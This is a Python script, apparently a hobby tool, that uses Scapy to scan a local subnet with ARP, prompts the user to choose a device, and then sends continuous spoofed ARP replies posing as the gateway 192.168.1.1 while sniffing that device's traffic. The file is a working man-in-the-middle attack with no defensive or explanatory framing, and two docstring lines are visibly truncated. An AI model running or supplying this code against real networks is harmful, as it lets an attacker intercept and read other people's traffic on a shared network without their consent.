from scapy.all import ARP, Ether, srp, send, sniff
import ipaddress
import time
import threading



def arp_spoof(target_ip, spoof_ip, target_mac=None):
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
    if target_mac:
        packet.hwdst = target_mac

    print(f"Sending spoofed ARP replies to {target_ip}...")
    try:
        while True:
            send(packet, verbose=False)
            time.sleep(1)
    except KeyboardInterrupt:
            print("\nStopping ARP spoofing.")



def sniff_traffic(interface=None):
    print("Starting to sniff traffic...")
    try:
        sniff(iface=interface, prn=process_packet, store=False)
    except KeyboardInterrupt:
        print("\nStopping traffic sniffing.")

def process_packet(packet):
   if packet.haslayer(Ether):
        src_mac = packet[Ether].src
        dst_mac = packet[Ether].dst
        print(f"Packet: {src_mac} -> {dst_mac}, Type: {packet.summary()}")




def scan_network(network):
    """
    Scans the network for connected devices.

    Args:
        network (str): The CIDR notation of the network (e>

    Returns:
        list: A list of dictionaries with IP and MAC addre>
    """
    devices = []
    try:
        # Create ARP request
        arp_request = ARP(pdst=str(network))
        ether_frame = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether_frame / arp_request

# Send packet and capture responses
        answered, _ = srp(packet, timeout=2, verbose=False)

        # Parse responses
        for sent, received in answered:
            devices.append({'ip': received.psrc, 'mac': received.hwsrc})
    except Exception as e:
        print(f"Error scanning the network: {e}")
    return devices

def main():    
    subnet = "192.168.1.0/24" # The subnet to scan (loacal)
    try:
        # Validate the subnet
        network = ipaddress.IPv4Network(subnet, strict=False)
        print(f"Scanning network: {subnet}")
        devices = scan_network(network)

        if devices:
            print("\nConnected devices:")
            for device in devices:
                print(f"IP: {device['ip']} - MAC: {device['mac']}")
        else:
            print("\nNo devices found.")
        return devices
    except ValueError as e:
        print(f"Invalid subnet: {e}")

if __name__ == "__main__":
    devices = main()
    print(devices)
    to_attack = int(input("Select the device to spoof: "))
    #print(devices[to_attack]['ip'])

    network_interface = "eth0"
    spoof_ip = "192.168.1.1"
    target_ip = devices[to_attack]['ip']
    target_mac = devices[to_attack]['mac']

    #arp_spoof(target_ip, spoof_ip, target_mac)

    # Start ARP spoofing in a separate thread
    spoof_thread = threading.Thread(target=arp_spoof, args=(target_ip, spoof_ip, target_mac))
    spoof_thread.start()

    # start sniffing traffic
    sniff_traffic(network_interface)